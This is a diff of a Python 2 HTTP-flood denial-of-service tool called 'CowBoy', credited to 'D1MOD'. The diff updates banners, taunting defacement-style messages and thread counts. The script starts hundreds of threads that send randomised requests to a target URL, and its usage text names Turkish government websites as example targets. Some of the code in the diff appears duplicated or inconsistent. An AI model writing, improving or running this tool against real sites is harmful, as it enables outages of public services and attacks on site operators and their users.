@@ -100,43 +100,7 @@ def keyword_list():
 
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
-
-
-#http request
-
-
-		
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
-
-
-
+	
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
@@ -146,11 +110,11 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'CowBoy Version 1.5'
-	print 'MADE BY D1MOD '
+	print 'CowBoy Version 1.7'
+	print 'Author : D1MOD'
 	print 'New loaded Botnets: 39,445,657'
-	print 'Usage: python2  CowBoy.py (url)'
-	print 'Example: python2 CowBoy.py https://www.mfa.gov.tr/'
+	print 'Usage: python2 CowBoy.py (url)'
+	print 'Example: python2 CowBoy.py https://gov.tr'
 	print "\a"
 print \
 """                                                       
@@ -173,9 +137,9 @@ print \
           ###!!!!!!#!!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!##
           ###!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!##
            ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
-            ###!!!!!!!!!!!!!!!!!!!!!MADY BY D1MOD!##
-             ###!!!!!!!!!!!!!!D1MOD ATTACKED SERVER##
-              ####!!!!!!!!!!!!!CowBoy###
+            ###!!!!!!!!!!!!!!!!!!!!!CowBoy Version 1.7!##
+             ###!!!!!!!!!!!!!!MADE BY D1MOD##
+              ####!!!!!!!!!!!!!1877 TEAM UP###
                 ####!!!!!!!!!!!!!!!!!###
                    #################                                                        
 """
@@ -204,10 +168,10 @@ def httpcall(url):
 			#print e.code
 			set_flag(1)
  			print '                                                                    '
- 			print 'ATTACKED BY D1MOD'
- 			print 'YOU WEBSITE GOT FUCKED BY CowBoy DDOS-ATTACK'
- 			print '#~~~~~~>ATTACKED BY D1MOD<~~~~#'
- 			print '#~~~>1877 UP<~~~#'
+ 			print '#~~~~~~~>ATTACKED BY D1MOD<~~#'
+ 			print '#~~~~~~>ATTACKED BY COWBOY<~~~~~~~~#'
+ 			print '#~~~~~~>YOUR WEBSITE GET BULLET<~~~~#'
+ 			print '#~~~>CowBoy Destroyed The Databases<~~~#'
  			print '                                                                    '
 			code=500
 	except urllib2.URLError, e:
@@ -236,57 +200,11 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>CowBoy Attack's Sended: %d Sending more<~~~#" % (request_counter)
+				print "#~~~>iStorm DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n ~>The Attacks Get Stop<~"
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
-			
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
-
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-		
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()			
-			
-			
-			
-			
 #execute 
 if len(sys.argv) < 2:
 	usage()
@@ -296,18 +214,16 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("Starting Break Some Server And Databases")
-		print("Created by D1MOD")
+		print("CowBoy Attack The Server And Databases")
+		print("MADE BY D1MOD")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-			host = m.group(1)
-		for i in range(10000):
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
-	
